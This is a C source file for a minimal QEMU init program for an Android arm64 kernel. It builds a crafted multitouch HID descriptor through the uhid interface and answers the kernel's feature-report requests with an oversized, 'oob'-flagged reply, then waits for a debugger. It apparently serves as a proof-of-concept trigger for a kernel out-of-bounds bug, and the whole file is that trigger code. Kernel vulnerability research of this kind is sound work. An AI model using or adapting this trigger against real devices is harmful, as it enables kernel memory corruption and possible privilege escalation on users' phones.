/* qemu_init.c — QEMU 最小 init + 触发探针
 * 编译: aarch64-linux-android35-clang -static -O2 -o init qemu_init.c
 * 放入 initrd: /init
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/select.h>
#include <dirent.h>
#include <linux/uhid.h>
#include <sys/sysmacros.h>

static int ufd = -1;
static unsigned char evbuf[sizeof(struct uhid_event)];

static void write_ev(int type, uint32_t cookie, int oob) {
    struct uhid_event *ev = (struct uhid_event *)evbuf;
    memset(ev, 0, sizeof(*ev));
    ev->type = type;
    if (type == UHID_FEATURE_ANSWER) {
        ev->u.feature_answer.id = cookie;
        ev->u.feature_answer.err = 0;
        ev->u.feature_answer.size = oob ? 128 : 1;
        ev->u.feature_answer.data[0] = oob ? 3 : 0;
    }
    write(ufd, ev, sizeof(*ev));
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== QEMU init: start ===\n");

    /* mount /proc /sys */
    mkdir("/proc", 0755);
    if (mount("proc", "/proc", "proc", 0, NULL) < 0)
        printf("mount /proc: %s\n", strerror(errno));
    mkdir("/sys", 0755);
    if (mount("sysfs", "/sys", "sysfs", 0, NULL) < 0)
        printf("mount /sys: %s\n", strerror(errno));
    mkdir("/dev", 0755);
    /* try devtmpfs first */
    if (mount("devtmpfs", "/dev", "devtmpfs", 0, NULL) < 0) {
        printf("devtmpfs: %s, using mknod\n", strerror(errno));
    }

    /* find uhid major from /proc/devices */
    int uhid_major = -1;
    FILE *f = fopen("/proc/devices", "r");
    if (f) {
        char line[256];
        int in_char = 0;
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "Character devices:")) { in_char = 1; continue; }
            if (strstr(line, "Block devices:")) break;
            if (in_char) {
                int maj;
                char name[64];
                if (sscanf(line, " %d %63s", &maj, name) == 2 && strstr(name, "uhid")) {
                    uhid_major = maj;
                    printf("uhid major=%d\n", maj);
                    break;
                }
            }
        }
        fclose(f);
    }
    if (uhid_major < 0) {
        printf("uhid not found in /proc/devices! full dump:\n");
        f = fopen("/proc/devices", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) printf("DEV| %s", line);
            fclose(f);
        }
        /* fallback: uhid is a misc device, major 10, minor from /proc/misc */
        printf("trying misc major 10 fallback...\n");
        int uhid_minor = -1;
        f = fopen("/proc/misc", "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                int mi;
                char mn[64];
                if (sscanf(line, " %d %63s", &mi, mn) == 2 && strstr(mn, "uhid")) {
                    uhid_minor = mi;
                    printf("proc/misc: uhid minor=%d\n", mi);
                    break;
                }
            }
            fclose(f);
        }
        if (uhid_minor >= 0) {
            if (mknod("/dev/uhid", S_IFCHR | 0600, makedev(10, uhid_minor)) < 0)
                printf("mknod fallback: %s\n", strerror(errno));
        } else {
            printf("uhid not in /proc/misc either!\n");
            return 1;
        }
    }
    /* mknod /dev/uhid */
    if (mknod("/dev/uhid", S_IFCHR | 0600, makedev(uhid_major, 0)) < 0)
        printf("mknod: %s\n", strerror(errno));

    /* open uhid */
    ufd = open("/dev/uhid", O_RDWR | O_CLOEXEC);
    if (ufd < 0) { printf("open uhid: %s\n", strerror(errno)); return 1; }
    printf("uhid opened fd=%d\n", ufd);

    /* create device */
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE;
    strcpy((char*)ev.u.create.name, "qemu_mt");
    strcpy((char*)ev.u.create.phys, "qemu");
    strcpy((char*)ev.u.create.uniq, "q0");
    ev.u.create.rd_data = (void*)(uintptr_t)0;  /* we'll use CREATE2 style but via CREATE */
    /* For legacy CREATE, the rd_data is a user pointer embedded in the struct */
    /* We need to write the descriptor to a known location */
    /* Actually, for kernel 5.4 uhid_create, rd_data is __u64 which we set to a user pointer */

    /* Build descriptor inline (WPTP + report2 120B + report3 248B) */
    static unsigned char desc[4096];
    static const unsigned char wptp[] = {
    0x05,0x0D,0x09,0x05,0xA1,0x01,
        0x85,0x01,
        0x09,0x56,0x24,0x00,0x26,0xFF,0xFF,0x75,0x10,0x95,0x01,0x81,0x02,
        0x09,0x54,0x25,0x05,0x75,0x08,0x81,0x02,
        0x05,0x20,0x0A,0x94,0x04,0x15,0x00,0x26,0xFF,0x0F,0x35,0x00,
        0x46,0xFF,0x0F,0x65,0x12,0x75,0x0C,0x95,0x01,0x81,0x02,
        0x05,0x0D,0x09,0x22,0xA1,0x02,
            0x09,0x51,0x25,0x0F,0x75,0x04,0x95,0x01,0x81,0x02,
            0x09,0x42,0x25,0x01,0x75,0x01,0x81,0x02,
            0x09,0x47,0x81,0x02,0x95,0x05,0x81,0x03,
            0x05,0x01,0x09,0x30,0x15,0x00,0x26,0xC8,0x00,0x35,0x00,
            0x45,0x69,0x65,0x11,0x75,0x10,0x95,0x01,0x81,0x02,
            0x09,0x31,0x26,0x96,0x00,0x45,0x4B,0x81,0x02,
            0x05,0x0D,0x09,0x30,0x15,0x00,0x26,0xFF,0x0F,0x35,0x00,
            0x46,0xFF,0x0F,0x65,0x12,0x75,0x0C,0x95,0x01,0x81,0x02,
        0xC0,
        0x05,0x09,0x09,0x01,0x15,0x00,0x25,0x01,0x75,0x01,0x95,0x01,
        0x81,0x02,0x95,0x07,0x81,0x03,
        0x85,0x02,
        0x05,0x0D,0x09,0x55,0x25,0x05,0x75,0x08,0x95,0x01,0xB1,0x02,
        0x09,0x59,0x25,0x02,0xB1,0x02,
        0x85,0x40,
        0x05,0x0D,0x09,0xB0,0x15,0x01,0x25,0x03,0x35,0x6E,0x45,0xBE,
        0x65,0x12,0x75,0x02,0x95,0x01,0xB1,0x02,
        0x85,0x41,
        0x05,0x0E,0x09,0x01,0xA1,0x02,
            0x09,0x23,0x15,0x00,0x25,0x04,0x75,0x08,0x95,0x01,0xB1,0x02,
        0xC0,
    0xC0,
    };
    /* insert pad118 + rep3 */
    static const unsigned char pad118[] = { 0x75,0x08, 0x95,0x76, 0xB1,0x03 };
    static const unsigned char rep3[]  = { 0x85,0x03, 0x75,0x08, 0x95,0xF8, 0xB1,0x03 };
    int pos=0, i=0, insA=-1;
    while(i<(int)sizeof(wptp)-5){
        if(wptp[i]==0x09&&wptp[i+1]==0x59&&wptp[i+2]==0x25&&wptp[i+3]==0x02
           &&wptp[i+4]==0xB1&&wptp[i+5]==0x02){insA=i+6;break;}
        i++;
    }
    memcpy(desc+pos,wptp,insA); pos+=insA;
    memcpy(desc+pos,pad118,sizeof(pad118)); pos+=sizeof(pad118);
    memcpy(desc+pos,rep3,sizeof(rep3)); pos+=sizeof(rep3);
    memcpy(desc+pos,wptp+insA,sizeof(wptp)-insA); pos+=sizeof(wptp)-insA;
    unsigned desc_len = pos;

    ev.u.create.rd_data = (void*)(uintptr_t)desc;
    ev.u.create.rd_size = desc_len;
    ev.u.create.bus = 0x0003; /* BUS_USB */
    ev.u.create.vendor = 0x1234;
    ev.u.create.product = 0x5678;
    ev.u.create.version = 1;
    ev.u.create.country = 0;

    ssize_t w = write(ufd, &ev, sizeof(ev));
    printf("CREATE ret=%zd\n", w);
    if (w <= 0) { printf("create failed: %s\n", strerror(errno)); return 1; }

    /* event loop: answer GET_REPORT with type+1 protocol */
    int get_count = 0;
    for (int t = 0; t < 200; t++) {
        struct timeval tv = {0, 50000};
        fd_set rf; FD_ZERO(&rf); FD_SET(ufd, &rf);
        if (select(ufd+1, &rf, NULL, NULL, &tv) <= 0) continue;
        ssize_t r = read(ufd, &ev, sizeof(ev));
        if (r <= 0) continue;
        if (ev.type == UHID_START) { printf("UHID_START\n"); continue; }
        if (ev.type == UHID_OPEN || ev.type == UHID_CLOSE) continue;
        if (ev.type == 9 || ev.type == 13) { /* GET_REPORT / vendor */
            uint8_t rnum = ((uint8_t*)&ev.u)[4]; /* rnum at offset 4 in union */
            printf("GET_REPORT rnum=%u\n", rnum);
            write_ev(10, ev.u.feature.id, rnum == 2 ? 1 : 0); /* oob if report 2 */
            get_count++;
        }
        if (get_count >= 3) break; /* all 3 feature reports answered */
    }
    printf("GET_REPORT count=%d\n", get_count);
    printf("=== probe complete, sleeping for gdb ===\n");
    while(1) pause();
    return 0;
}
